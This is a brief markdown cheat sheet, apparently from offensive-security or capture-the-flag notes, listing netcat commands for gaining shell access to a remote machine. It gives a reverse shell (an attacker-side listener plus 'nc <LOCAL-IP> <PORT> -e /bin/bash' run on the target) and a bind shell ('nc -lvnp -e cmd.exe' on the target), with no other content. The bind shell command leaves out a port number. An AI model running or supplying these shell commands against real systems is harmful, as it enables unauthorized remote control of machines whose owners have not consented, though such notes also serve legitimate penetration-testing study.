# RCE/Remote Shell Tools

**Reverse Shell**

* We can force the remote server to send us command line access to the server
  * On attacking machine
    * `sudo nc -nlvp 443`
  * On target
    * `nc <LOCAL-IP> <PORT> -e /bin/bash`

**Bind** **Shell**

* We can force the remote server to open up a port on the server which we can connect to in order to execute further commands
  * On target
    * `nc -lvnp -e "cmd.exe"`
  * On attacking machine
    * `nc <MACHINE_IP> <port>`
